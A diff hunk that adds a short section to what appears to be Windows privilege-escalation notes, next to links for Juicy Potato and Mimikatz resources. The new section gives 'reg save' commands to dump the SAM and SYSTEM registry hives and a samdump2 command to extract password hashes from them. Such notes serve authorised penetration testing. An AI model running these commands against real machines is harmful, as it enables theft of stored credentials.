@@ -732,6 +732,17 @@ https://github.com/ohpe/juicy-potato
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md
 
+### Dumping SAM and SYSTEM File
 
+If you have the ability to read the SAM and SYSTEM files, you can extract the hashes.
 
+Dumping:
+```
+reg save hklm\system system
+reg save hklm\sam sam
+```
 
+Extract
+```
+samdump2 system sam
+```
